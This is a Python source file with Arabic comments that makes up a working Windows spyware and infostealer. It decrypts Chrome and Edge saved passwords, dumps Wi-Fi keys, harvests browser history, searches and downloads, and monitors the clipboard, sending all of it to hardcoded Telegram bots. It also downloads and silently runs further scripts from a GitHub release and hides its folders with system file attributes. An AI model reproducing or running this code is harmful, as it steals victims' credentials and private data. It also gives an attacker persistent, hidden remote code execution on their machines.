# احتفظ بكل الاستيرادات (Imports) التي وضعتها في بداية ملفك هنا...
import os, time, shutil, sqlite3, json, base64, subprocess, win32crypt, gc, requests, threading, runpy
from Crypto.Cipher import AES
from PIL import ImageGrab
import pygetwindow as gw
from pathlib import Path

# --- الثوابت ---
TELEGRAM_TOKEN = "8265205917:AAE4AtsWD52-kenwjYWrg6LtAZ25IEVOjVI"
CHAT_ID = "6693150100"
BASE_DIR = r"C:\ProgramData\WinExec"
CMD_FILE = os.path.join(BASE_DIR, "cmd.txt")
RES_FILE = os.path.join(BASE_DIR, "res.txt")
SS_FILE = os.path.join(BASE_DIR, "ss.png")
CREATE_NO_WINDOW = 0x08000000


#======================================================================================================
# SYSTEM INFORMATION ADVANCED


import os, requests
import platform
import socket
import subprocess
import uuid
import re
from datetime import datetime

OUTPUT_FILE = "system_audit_report.txt"


# ====================== System Profiling ======================
def system_profiling(logger):
    logger.log("System Profiling", "Collecting basic system info...")
    try:
        os_type = platform.system()
        os_release = platform.release()
        os_version = platform.version()
        arch = platform.machine()
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
        mac_addr = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        logger.log("OS", f"Type: {os_type}, Release: {os_release}, Version: {os_version}, Architecture: {arch}")
        logger.log("Network", f"Hostname: {hostname}, IP: {ip_addr}, MAC: {mac_addr}")

        if os_type == "Windows":
            try:
                domain_info = subprocess.check_output("wmic computersystem get domain", shell=True).decode().split()
                domain_workgroup = domain_info[1] if len(domain_info) > 1 else "Unknown"
            except:
                domain_workgroup = "N/A"
            logger.log("OS", f"Domain/Workgroup: {domain_workgroup}")

            try:
                patches = subprocess.check_output("wmic qfe get HotFixID,InstalledOn", shell=True).decode()
                logger.log("OS", f"Patches:\n{patches.strip()}")
            except:
                logger.log("OS", "Patches: Unable to retrieve")
        else:
            logger.log("OS", "Domain/Workgroup: N/A (Non-Windows)")
            logger.log("OS", "Patches: Manual check required (apt/yum etc.)")

    except Exception as e:
        logger.log("System Profiling", f"Error collecting system info: {e}")

# ====================== Users & Identity ======================
def users_identity(logger):
    logger.log("Users & Identity", "Collecting users, groups, sessions...")
    try:
        if platform.system() == "Windows":
            try:
                local_users = subprocess.check_output("net user", shell=True).decode(errors='ignore')
                logger.log("Local Users", local_users)
            except:
                logger.log("Local Users", "Unable to retrieve local users")

            try:
                admin_group = subprocess.check_output("net localgroup administrators", shell=True).decode(errors='ignore')
                logger.log("Admin Group", admin_group)
            except:
                logger.log("Admin Group", "Unable to retrieve")

            try:
                sessions = subprocess.check_output("query user", shell=True).decode(errors='ignore')
                logger.log("Active Sessions", sessions)
            except:
                logger.log("Active Sessions", "No active sessions or command missing")

            try:
                password_policy = subprocess.check_output("net accounts", shell=True).decode(errors='ignore')
                logger.log("Password Policy", password_policy)
            except:
                logger.log("Password Policy", "Unable to retrieve")

            try:
                trusts = subprocess.check_output("nltest /domain_trusts", shell=True).decode(errors='ignore')
                logger.log("Domain Trusts", trusts)
            except:
                logger.log("Domain Trusts", "nltest not found or not in domain environment")

        else:  # Linux / Unix
            try:
                local_users = subprocess.check_output("cut -d: -f1 /etc/passwd", shell=True).decode()
                logger.log("Local Users", local_users)
                sessions = subprocess.check_output("who", shell=True).decode()
                logger.log("Active Sessions", sessions)
                sudo_users = subprocess.check_output("grep '^sudo' /etc/group", shell=True).decode()
                logger.log("Sudo Users", sudo_users)
            except:
                logger.log("Users & Identity", "Limited info on non-Windows system")
    except Exception as e:
        logger.log("Users & Identity", f"Error: {e}")

# ====================== Privileges & Access ======================
def privileges_access(logger):
    logger.log("Privileges & Access", "Collecting user privileges and ACLs...")
    try:
        if platform.system() == "Windows":
            import ctypes
            try:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                logger.log("Current User", f"Admin: {is_admin}")
            except:
                logger.log("Current User", "Unable to detect admin")

            try:
                token_privs = subprocess.check_output("whoami /priv", shell=True).decode(errors='ignore')
                logger.log("Token Privileges", token_privs)
            except:
                logger.log("Token Privileges", "Unable to retrieve")

            paths = [os.environ.get('SystemRoot', 'C:\\Windows'), "C:\\Program Files"]
            for path in paths:
                access_type = "Write Access" if os.access(path, os.W_OK) else "Read/Execute Only"
                logger.log("ACL Check", f"{path}: {access_type}")

        else:
            uid_gid = f"UID: {os.getuid()}, GID: {os.getgid()}"
            logger.log("UID/GID", uid_gid)
            try:
                sudo_cap = subprocess.check_output("sudo -l", shell=True).decode(errors='ignore')
                logger.log("Sudo Capabilities", sudo_cap)
            except:
                logger.log("Sudo Capabilities", "Unable to retrieve")

    except Exception as e:
        logger.log("Privileges & Access", f"Error: {e}")

# ====================== Software & Services ======================
def software_services(logger):
    logger.log("Software & Services", "Collecting installed software, processes, and services...")
    try:
        if platform.system() == "Windows":
            try:
                proc_list = subprocess.check_output("tasklist /V /FO CSV", shell=True).decode(errors='ignore').splitlines()[:21]
                logger.log("Top Processes", "\n".join(proc_list))
            except:
                logger.log("Top Processes", "Unable to retrieve")

            try:
                services = subprocess.check_output("net start", shell=True).decode(errors='ignore')
                logger.log("Active Services", services)
            except:
                logger.log("Active Services", "Unable to retrieve")

            try:
                av_cmd = "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName"
                av_list = subprocess.check_output(av_cmd, shell=True).decode(errors='ignore')
                logger.log("Security Products", av_list.strip())
            except:
                logger.log("Security Products", "Unable to retrieve")

            # Remote tools
            tools = ["TeamViewer", "AnyDesk", "VNC", "Radmin", "Putty", "WinSCP"]
            try:
                tasklist_all = subprocess.check_output("tasklist", shell=True).decode(errors='ignore')
                found_tools = [t for t in tools if t.lower() in tasklist_all.lower()]
                logger.log("Remote Admin Tools", ", ".join(found_tools) if found_tools else "None found")
            except:
                logger.log("Remote Admin Tools", "Unable to detect")

        else:  # Linux
            try:
                processes = subprocess.check_output("ps aux | head -n 20", shell=True).decode()
                logger.log("Top Processes", processes)
                services = subprocess.check_output("systemctl list-units --type=service --state=running | head -n 20", shell=True).decode()
                logger.log("Running Services", services)
            except:
                logger.log("Software & Services", "Unable to retrieve processes/services")

    except Exception as e:
        logger.log("Software & Services", f"Error: {e}")

# ====================== Shared Resources ======================
def shared_resources(logger):
    logger.log("Shared Resources", "Checking SMB shares, printers, folders, and devices...")
    try:
        if platform.system() == "Windows":
            try:
                shares = subprocess.check_output("net share", shell=True).decode(errors='ignore')
                logger.log("SMB Shares", shares)
            except:
                logger.log("SMB Shares", "Unable to retrieve")

            try:
                printers = subprocess.check_output("wmic printer get name,shared,sharename", shell=True).decode(errors='ignore')
                logger.log("Printers", printers)
            except:
                logger.log("Printers", "Unable to retrieve")

            paths = [os.path.join(os.environ.get('SystemDrive', 'C:'), 'Users'), os.environ.get('ProgramFiles', 'C:\\Program Files')]
            for path in paths:
                try:
                    perms = subprocess.check_output(f'icacls "{path}"', shell=True).decode(errors='ignore')
                    logger.log("Folder Permissions", f"{path}:\n{perms}")
                except:
                    logger.log("Folder Permissions", f"{path}: Unable to retrieve")
            
            # Peripherals
            try:
                usb = subprocess.check_output("wmic path Win32_USBHub get DeviceID,Status", shell=True).decode(errors='ignore')
                logger.log("USB Devices", usb)
            except:
                logger.log("USB Devices", "Unable to detect")
            try:
                cams = subprocess.check_output("wmic path Win32_PnPEntity where \"Service='usbvideo'\" get caption", shell=True).decode(errors='ignore')
                logger.log("Cameras/Webcams", cams.strip() if cams.strip() else "None found")
            except:
                logger.log("Cameras/Webcams", "Unable to detect")
            try:
                audio = subprocess.check_output("wmic path Win32_SoundDevice get caption,status", shell=True).decode(errors='ignore')
                logger.log("Audio Devices", audio.strip() if audio.strip() else "None found")
            except:
                logger.log("Audio Devices", "Unable to detect")

    except Exception as e:
        logger.log("Shared Resources", f"Error: {e}")

# ====================== Remote Execution & Service Audit ======================
def remote_execution_service(logger):
    logger.log("Remote Execution & Services", "Checking remote execution surfaces and service configs...")
    try:
        if platform.system() == "Windows":
            try:
                winrm_status = subprocess.check_output("sc query WinRM", shell=True).decode(errors='ignore')
                logger.log("WinRM Status", winrm_status)
            except:
                logger.log("WinRM Status", "Unable to query")

            try:
                wmi_test = subprocess.check_output("wmic process get caption /format:list", shell=True).decode(errors='ignore')
                logger.log("WMI Access", "Accessible")
            except:
                logger.log("WMI Access", "Restricted/Disabled")

            # Services with potential misconfigurations
            try:
                services = subprocess.check_output('wmic service get name,pathname,startname', shell=True).decode(errors='ignore').splitlines()
                for svc in services:
                    parts = svc.split()
                    if len(parts) > 1:
                        path = parts[-2]  # approximate path
                        if os.path.exists(path) and os.access(path, os.W_OK):
                            logger.log("Service Path Risk", f"{svc} is writable")
            except:
                logger.log("Service Path Risk", "Unable to check")

    except Exception as e:
        logger.log("Remote Execution & Services", f"Error: {e}")

# ====================== Persistence ======================
def persistence(logger):
    logger.log("Persistence Mechanisms", "Checking startup tasks, scheduled tasks, and services...")
    try:
        if platform.system() == "Windows":
            # Startup registry
            run_keys = [r"Software\Microsoft\Windows\CurrentVersion\Run",
                        r"Software\Microsoft\Windows\CurrentVersion\RunOnce"]
            import winreg
            for key in run_keys:
                for hive, hname in [(winreg.HKEY_CURRENT_USER,"HKCU"), (winreg.HKEY_LOCAL_MACHINE,"HKLM")]:
                    try:
                        with winreg.OpenKey(hive, key) as regkey:
                            for i in range(winreg.QueryInfoKey(regkey)[1]):
                                name, value, _ = winreg.EnumValue(regkey, i)
                                logger.log("Startup Entry", f"[{hname}] {name} -> {value}")
                    except:
                        continue
            # Scheduled tasks
            try:
                tasks = subprocess.check_output('schtasks /query /fo LIST /v | findstr /V /I "Microsoft"', shell=True).decode(errors='ignore')
                tasks_list = [line for line in tasks.splitlines() if "TaskName:" in line][:10]
                for t in tasks_list:
                    logger.log("Scheduled Task", t.strip())
            except:
                logger.log("Scheduled Task", "Unable to retrieve")
    except Exception as e:
        logger.log("Persistence Mechanisms", f"Error: {e}")



import urllib.request
import mimetypes

def send_to_telegram(file_path):
    token = "8265205917:AAE4AtsWD52-kenwjYWrg6LtAZ25IEVOjVI"
    chat_id = "6693150100"
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    
    try:
        boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
        with open(file_path, 'rb') as f:
            file_content = f.read()
        
        # بناء جسم الطلب يدوياً (Multi-part form data)
        data = []
        data.append(f'--{boundary}'.encode())
        data.append(f'Content-Disposition: form-data; name="chat_id"'.encode())
        data.append(''.encode())
        data.append(chat_id.encode())
        
        data.append(f'--{boundary}'.encode())
        data.append(f'Content-Disposition: form-data; name="document"; filename="{os.path.basename(file_path)}"'.encode())
        data.append(f'Content-Type: text/plain'.encode())
        data.append(''.encode())
        data.append(file_content)
        
        data.append(f'--{boundary}--'.encode())
        data.append(''.encode())
        
        body = b'\r\n'.join(data)
        req = urllib.request.Request(url, data=body)
        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        
        with urllib.request.urlopen(req) as response:
            if response.getcode() == 200:
                print("[+] Report sent via Standard Library.")
    except Exception as e:
        print(f"[-] Standard Lib Error: {e}")

class Logger:
    def __init__(self, filename):
        self.filename = filename
        with open(self.filename, 'w', encoding='utf-8') as f:
            f.write(f"System Audit Report - {datetime.now()}\n")
            f.write("="*80 + "\n\n")

    def log(self, category, info):
        with open(self.filename, 'a', encoding='utf-8') as f:
            f.write(f"[{category.upper()}] {info}\n")


# ====================== Run Full Audit ======================
def run_full_audit():
    logger = Logger(OUTPUT_FILE)
    system_profiling(logger)
    users_identity(logger)
    privileges_access(logger)
    software_services(logger)
    shared_resources(logger)
    remote_execution_service(logger)
    persistence(logger)
    print(f"Audit completed. Results saved in {OUTPUT_FILE}")
    send_to_telegram(OUTPUT_FILE)

#if __name__ == "__main__":
    #run_full_audit()




#=========================================================================================================================================

# --- الدوال (نفس دوالك تماماً) ---
def send_to_telegram(file_path):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
        with open(file_path, "rb") as f:
            payload = {"chat_id": CHAT_ID}
            files = {"document": f}
            response = requests.post(url, data=payload, files=files, timeout=30)
        return response.status_code == 200
    except: return False

def get_master_key(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    except: return None

def decrypt_password(buff, m_key):
    try:
        cipher = AES.new(m_key, AES.MODE_GCM, buff[3:15])
        return cipher.decrypt(buff[15:])[:-16].decode()
    except: return f"Hash: {base64.b64encode(buff).decode()}"

def run_passwords():
    out = ""
    user_p = os.path.expanduser('~')
    browsers = {
        "Edge": user_p + r"\AppData\Local\Microsoft\Edge\User Data", 
        "Chrome": user_p + r"\AppData\Local\Google\Chrome\User Data"
    }
    
    for name, path in browsers.items():
        db, st = path + r"\Default\Login Data", path + r"\Local State"
        if os.path.exists(db):
            out += f"\n--- {name} Passwords ---\n"
            
            # نحدد المتغيرات خارج try لنتمكن من الوصول لها في finally
            conn = None
            tmp = os.path.join(os.environ["TEMP"], f"tmp_{name}.db")
            
            try:
                m_key = get_master_key(st)
                shutil.copyfile(db, tmp)
                
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for row in cur.fetchall():
                    if row[1].strip():
                        out += f"🌐 Site: {row[0]}\n📧 User: {row[1]}\n🔑 Pass: {decrypt_password(row[2], m_key)}\n---\n"
                
            except Exception as e:
                out += f"Err {name}: {e}\n"
            
            finally:
                # هذا الجزء هو "صمام الأمان" - يعمل في كل الظروف
                if conn:
                    conn.close()  # إغلاق قاعدة البيانات حتماً
                if os.path.exists(tmp):
                    try: os.remove(tmp) # حذف الملف المؤقت حتماً
                    except: pass
                
                # تنظيف الذاكرة بعد كل متصفح
                gc.collect() 
                
    return out or "No Passwords Found."
    

def run_wifi():
    try:
        cmd = 'netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $name = $_.ToString().Split(":")[1].Trim(); $key = (netsh wlan show profile name=$name key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim(); "SSID: $name | Pass: $key" }'

        
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
            capture_output=True,
            text=True,
            encoding="cp850",
            creationflags=CREATE_NO_WINDOW
        ).stdout
        return res if res.strip() else "No WiFi profiles found."
    except:
        return "⚠️ Error retrieving WiFi or No saved networks."

def run_history():
    out = ""
    user_p = os.path.expanduser('~')
    paths = {
        "Edge": user_p + r"\AppData\Local\Microsoft\Edge\User Data\Default\History", 
        "Chrome": user_p + r"\AppData\Local\Google\Chrome\User Data\Default\History"
    }
    
    for b, p in paths.items():
        if os.path.exists(p):
            out += f"--- {b} History ---\n"
            
            conn = None
            # جعل اسم الملف المؤقت فريداً لكل متصفح لضمان عدم التداخل
            tmp = os.path.join(os.environ["TEMP"], f"h_tmp_{b}.db")
            
            try:
                shutil.copyfile(p, tmp)
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                
                cur.execute("SELECT title, url FROM urls ORDER BY last_visit_time DESC LIMIT 15")
                for r in cur.fetchall(): 
                    out += f"🔹 {r[0][:50]}\n🔗 {r[1]}\n\n"
                
            except Exception as e:
                # يمكنك تركها فارغة أو تسجيل الخطأ في متغير out للمتابعة
                pass
                
            finally:
                # ضمان إغلاق الاتصال وحذف الملف مهما حدث
                if conn:
                    conn.close()
                if os.path.exists(tmp):
                    try: os.remove(tmp)
                    except: pass
                
                # تنظيف الذاكرة (الرام) بعد معالجة كل متصفح
                gc.collect() 
                
    return out
#################################################################################################
CROSSMOS_PATH = Path(r"C:\ProgramData\WinCore\wincore.py")
CROSSMOS_URL  = "https://github.com/anaslabrini/crossmos/releases/download/v1.0/wincore.py"
PYTHON_EXEC   = Path(r"C:\ProgramData\WinCore\pywin.exe")

def update():
    try:
        if os.path.exists(CMD_FILE):
            os.remove(CMD_FILE)
        if CROSSMOS_PATH.exists():
            CROSSMOS_PATH.unlink()
            print("[+] Deleted old crossmos.py")

        r = requests.get(CROSSMOS_URL, timeout=30)
        if r.status_code != 200 or len(r.content) < 100:
            print("[!] Failed to download the new crossmos.py")
            return

        with open(CROSSMOS_PATH, "wb") as f:
            f.write(r.content)
        print("[+] Downloaded new crossmos.py successfully")

        subprocess.Popen(
            [str(PYTHON_EXEC), str(CROSSMOS_PATH)],
            cwd=str(CROSSMOS_PATH.parent),
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=0x08000000  
        )
        print("[+] crossmos.py launched successfully")

    except Exception as e:
        print(f"[!] Update failed: {e}")


BASE_DIR_SYSKEY = r"C:\ProgramData\SysKey"
SCRIPT_NAME = "syskey.py"
LOCAL_PYTHON_NAME = "pwiny.exe"
SOURCE_PYTHON = r"C:\ProgramData\WinCore\pywin.exe"
GITHUB_URL = "https://github.com/anaslabrini/crossmos/releases/download/v1.0/syskey.py"

def download_and_run():
    try:
        if not os.path.exists(BASE_DIR_SYSKEY):
            os.makedirs(BASE_DIR_SYSKEY)

        script_path = os.path.join(BASE_DIR_SYSKEY, SCRIPT_NAME)
        local_python_path = os.path.join(BASE_DIR_SYSKEY, LOCAL_PYTHON_NAME)

        if not os.path.exists(local_python_path) and os.path.exists(SOURCE_PYTHON):
            shutil.copy2(SOURCE_PYTHON, local_python_path)

        r = requests.get(GITHUB_URL, timeout=10)
        r.raise_for_status()
        with open(script_path, "wb") as f:
            f.write(r.content)

        subprocess.Popen(
            [local_python_path, script_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
        )
        return "DOWNLOAD_AND_RUN_SUCCESS"
    except Exception as e:
        return f"ERROR: {str(e)}"

def remove_script():
    try:
        subprocess.run(
            ["taskkill", "/F", "/IM", LOCAL_PYTHON_NAME, "/T"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        time.sleep(2)

        if os.path.exists(BASE_DIR_SYSKEY):
            shutil.rmtree(BASE_DIR_SYSKEY, ignore_errors=True)
            
        return "REMOVE_SUCCESS"
    except Exception as e:
        return f"ERROR_DURING_REMOVE: {str(e)}"


#################################################################################################
FILES = {
    "winmon.py": "https://github.com/anaslabrini/crossmos/releases/download/v1.0/winmon.py",
    "windef.py": "https://github.com/anaslabrini/crossmos/releases/download/v1.0/windef.py"
}

BASE_DIR = Path(__file__).parent.resolve()

def ensure_file(filename, url):
    file_path = BASE_DIR / filename

    if not file_path.exists():
        print(f"[+] Downloading {filename} ...")
        r = requests.get(url, timeout=15)
        r.raise_for_status()
        file_path.write_bytes(r.content)
        print(f"[+] {filename} downloaded successfully.")
    else:
        print(f"[i] {filename} already exists.")

    return file_path

def run_script(path):
    print(f"[>] Starting {path.name}")
    runpy.run_path(str(path), run_name="__main__")


def startup():
    for filename, url in FILES.items():
        path = ensure_file(filename, url)
        t = threading.Thread(target=run_script, args=(path,), daemon=True)
        t.start()

if __name__ == "__main__":
    threading.Thread(target=startup, daemon=True).start()

##############################################################################################

import ctypes
import os
from pathlib import Path

EXTRA_TARGETS = [
    r"C:\ProgramData\WinCore",
    r"C:\ProgramData\WinExec"
]

def apply_deep_stealth(target_path):
    """
    تطبيق سمات النواة: مخفي + نظام + قراءة فقط + منع الفهرسة.
    تجعل الملف غير مرئي حتى مع تفعيل 'إظهار الملفات المخفية'.
    """
    try:
        attrs = 0x01 | 0x02 | 0x04 | 0x2000
        path_str = str(target_path)
        
        success = ctypes.windll.kernel32.SetFileAttributesW(path_str, attrs)
        return success
    except Exception:
        return False

def protect_assets(target_dir):
    """تطبيق الإخفاء على المجلد وكل ما بداخله"""
    path = Path(target_dir)
    if not path.exists():
        return

    for item in path.rglob('*'): 
        apply_deep_stealth(item)
    
    apply_deep_stealth(path)

def start_concealment_protocol():
    current_dir = Path(__file__).parent.resolve()
    print(f"[*] Concealing infrastructure at: {current_dir}")
    protect_assets(current_dir)

    for target in EXTRA_TARGETS:
        if os.path.exists(target):
            print(f"[*] Applying deep stealth to external target: {target}")
            protect_assets(target)
        else:
            print(f"[!] Target not found, skipping: {target}")

#if __name__ == "__main__":
    #start_concealment_protocol()


import os
import shutil
import sqlite3
import urllib.parse
from datetime import datetime, timedelta

def extract_all_browser_history():
    current_script_dir = os.path.dirname(os.path.abspath(__file__))
    user_p = os.path.expanduser("~")

    paths = {
        "CHROME": user_p + r"\AppData\Local\Google\Chrome\User Data\Default\History",
        "EDGE": user_p + r"\AppData\Local\Microsoft\Edge\User Data\Default\History",
        "BRAVE": user_p + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History",
        "OPERA": user_p + r"\AppData\Roaming\Opera Software\Opera GX Stable\History"
    }

    SEARCH_KEYS = ["q", "search_query"]

    def chrome_time_to_datetime(chrome_time):
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)
        except:
            return None

    for browser_name, history_path in paths.items():
        if not os.path.exists(history_path):
            continue

        results = []
        conn = None 
        temp_copy = os.path.join(current_script_dir, f"{browser_name}_Temp_History.db")
        output_file = os.path.join(current_script_dir, f"{browser_name}_SEARCH_HISTORY.txt")
        
        try:
            shutil.copy2(history_path, temp_copy)
            conn = sqlite3.connect(temp_copy)
            cur = conn.cursor()
            cur.execute("SELECT url, last_visit_time FROM urls WHERE url LIKE '%?%'")

            for url, last_visit in cur.fetchall():
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)

                for key in SEARCH_KEYS:
                    if key in params:
                        raw_query = params[key][0].strip()
                        if not raw_query: continue
                        clean_query = urllib.parse.unquote_plus(raw_query)
                        visit_time = chrome_time_to_datetime(last_visit)
                        visit_time_str = visit_time.strftime("%Y-%m-%d %H:%M:%S") if visit_time else "Unknown"
                        results.append((visit_time_str, browser_name, clean_query, url))

            conn.close()
            conn = None 
            
            if results:
                results = list(dict.fromkeys(results))
                results.sort(key=lambda x: x[0])

                with open(output_file, "w", encoding="utf-8") as f:
                    f.write(f"FULL {browser_name} SEARCH HISTORY\n")
                    f.write("=" * 60 + "\n\n")
                    for time_s, b_name, query, url_val in results:
                        f.write(f"Time   : {time_s}\nSearch : {query}\nURL    : {url_val}\n{'-' * 60}\n")
                
                # إرسال الملف فوراً
                send_to_telegram(output_file)

        except Exception as e:
            print(f"❌ Error: {e}")
        
        finally:
            # --- تنظيف ملفات الدالة المؤقتة ---
            if conn:
                try: conn.close()
                except: pass
            if os.path.exists(temp_copy):
                try: os.remove(temp_copy)
                except: pass
            if os.path.exists(output_file):
                try: os.remove(output_file)
                except: pass
            
            # --- تنظيف ملفات التحكم الرئيسية (لمنع التكرار) ---
            if os.path.exists(CMD_FILE):
                try: os.remove(CMD_FILE)
                except: pass
            if os.path.exists(RES_FILE):
                try: os.remove(RES_FILE)
                except: pass
            
            del results
            gc.collect()

    return "HISTORY_PROCESS_COMPLETE"
        # ----------------------------------------------------------------
# ========================================================================
# Spyware Copy and Paste

import time
import pyperclip
import threading
import requests
import gc 

TELEGRAM_TOKEN_paste = "8552770579:AAFMfGYJ1WJmge_ofdi0p7VPiY92EKhPVGM"
CHAT_ID_paste = "6693150100"

_s_v_c = requests.Session()

def _z9_p2_mQ(p_data):
    _u_r_l = f"https://api.telegram.org/bot{TELEGRAM_TOKEN_paste}/sendMessage"
    
    if len(p_data) > 4000:
        p_data = p_data[:4000] + "... [Truncated]"
        
    _p_l = {
        "chat_id": CHAT_ID_paste,
        "text": p_data
    }
    try:
        _s_v_c.post(_u_r_l, data=_p_l, timeout=10)
    except:
        pass
    finally:
        # تنظيف البيانات المؤقتة بعد كل محاولة إرسال
        del _p_l
        gc.collect()

def qx9_7pL0v():
    _a = ""

    while True:
        try:
            _b = pyperclip.paste()

            if _b != _a:
                _a = _b
                
                if _b and _b.strip():
                    # إرسال المحتوى مع حماية من تشنج العملية
                    _z9_p2_mQ(f"📋 Clip Update:\n\n{_b}")

            # تفريغ المتغيرات الكبيرة دورياً
            if len(_a) > 10000:
                _a = _b[:100] # تقليص حجم الذاكرة المستخدمة للمقارنة

        except Exception:
            pass
            
        # وقت الانتظار لتقليل استهلاك المعالج
        time.sleep(0.5)

def k3M_x92Qa():
    # تم الإبقاء على threading كما طلبت مع ضمان استقراره
    _t = threading.Thread(target=qx9_7pL0v)
    _t.daemon = False # جعل الخيط خلفياً لضمان إغلاقه مع البرنامج الرئيسي
    _t.start()

# =============================

import os
import shutil
import sqlite3
from datetime import datetime, timedelta

def extract_all_browser_downloads():
    current_script_dir = os.path.dirname(os.path.abspath(__file__))
    user_p = os.path.expanduser("~")

    paths = {
        "CHROME": user_p + r"\AppData\Local\Google\Chrome\User Data\Default\History",
        "EDGE": user_p + r"\AppData\Local\Microsoft\Edge\User Data\Default\History",
        "BRAVE": user_p + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History",
        "OPERA": user_p + r"\AppData\Roaming\Opera Software\Opera GX Stable\History"
    }

    def chrome_time_to_datetime(chrome_time):
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)
        except:
            return None

    for browser_name, history_path in paths.items():
        if not os.path.exists(history_path):
            continue

        results = []
        conn = None 
        temp_copy = os.path.join(current_script_dir, f"{browser_name}_DL_Temp.db")
        output_file = os.path.join(current_script_dir, f"{browser_name}_DOWNLOADS.txt")
        
        try:
            shutil.copy2(history_path, temp_copy)
            conn = sqlite3.connect(temp_copy)
            cur = conn.cursor()

            cur.execute("SELECT d.id, d.target_path, d.start_time FROM downloads d")
            downloads = cur.fetchall()

            for download_id, target_path, start_time in downloads:
                cur.execute("""
                    SELECT url 
                    FROM downloads_url_chains 
                    WHERE id = ? 
                    ORDER BY chain_index 
                    LIMIT 1
                """, (download_id,))

                row = cur.fetchone()
                if not row: continue

                url = row[0]
                time_dt = chrome_time_to_datetime(start_time)
                time_str = time_dt.strftime("%Y-%m-%d %H:%M:%S") if time_dt else "Unknown"

                results.append((time_str, browser_name, target_path, url))

            conn.close()
            conn = None 
            
            if os.path.exists(temp_copy):
                os.remove(temp_copy)

            if results:
                results = list(dict.fromkeys(results))
                results.sort(key=lambda x: x[0])

                # إنشاء الملف النصي
                with open(output_file, "w", encoding="utf-8") as f:
                    f.write(f"FULL {browser_name} DOWNLOAD HISTORY\n")
                    f.write("=" * 65 + "\n\n")

                    for time_s, b_name, f_path, f_url in results:
                        f.write(f"Time   : {time_s}\n")
                        f.write(f"File   : {f_path}\n")
                        f.write(f"URL    : {f_url}\n")
                        f.write("-" * 65 + "\n")
                
                # --- الخطوة الجديدة: الإرسال ثم الحذف الفوري ---
                if os.path.exists(output_file):
                    # إرسال الملف إلى تليجرام
                    sent = send_to_telegram(output_file)
                    
                    # حذف الملف من القرص فوراً بعد الإرسال (سواء نجح أو فشل لضمان الأمان)
                    try:
                        os.remove(output_file)
                        print(f"🗑️ File {output_file} deleted from disk.")
                    except:
                        pass
                # ----------------------------------------------

        except Exception as e:
            print(f"❌ Error in {browser_name}: {e}")
        
        finally:
            # التنظيف النهائي للذاكرة والملفات العالقة
            if conn:
                try: conn.close()
                except: pass
            if os.path.exists(temp_copy):
                try: os.remove(temp_copy)
                except: pass
            if os.path.exists(output_file): # للتأكد من حذفه إذا حدث خطأ قبل الإرسال
                try: os.remove(output_file)
                except: pass
            
            del results
            gc.collect() 

    return "DOWNLOADS_PROCESSED_AND_CLEANED"
        # ----------------------------------------------------------------------



# =============================
if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)
    # تنظيف المخلفات القديمة عند بدء التشغيل لأول مرة
for f in [CMD_FILE, RES_FILE, SS_FILE]:
    try:
        if os.path.exists(f): os.remove(f)
    except: pass

gc.collect() # ابدأ بذاكرة نظيفة
